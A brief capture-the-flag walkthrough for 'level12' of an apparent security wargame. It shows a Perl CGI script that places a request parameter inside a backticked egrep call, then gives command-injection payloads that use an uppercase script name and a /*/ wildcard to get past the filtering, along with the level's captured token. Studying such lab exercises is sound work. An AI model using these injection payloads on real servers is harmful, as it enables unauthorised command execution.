Contents of level12.pl :

#!/usr/bin/env perl
# localhost:4646
use CGI qw{param};
print "Content-type: text/html\n\n";

sub t {
  $nn = $_[1];
  $xx = $_[0];
  $xx =~ tr/a-z/A-Z/; 
  $xx =~ s/\s.*//;
  @output = `egrep "^$xx" /tmp/xd 2>&1`;
  foreach $line (@output) {
      ($f, $s) = split(/:/, $line);
      if($s =~ $nn) {
          return 1;
      }
  }
  return 0;
}

sub n {
  if($_[0] == 1) {
      print("..");
  } else {
      print(".");
  }    
}

The server on port 4646 accepts 2 parameters

The regex tr/a-z/A-Z/ transforms alpha chars to uppercase
The other regex s/\s.*// removes all space chars

to get the exploit working we have to use uppercase only => call a script named with uppercase only => use wildcard * to exploit filepath to the script because /tmp can't be written with lowercase characters

/!\ give execution permission for the script with ```chmod +x /tmp/EXPLOIT.SH```

in the browser : http://192.168.56.2:4646/?x=$(/*/EXPLOIT.SH)
or with curl : curl localhost:4646?x='`/*/EXPLOIT.SH`'

we get the token : g1qKMiRpXf53AWhDaU7FEkczr

```su level13```


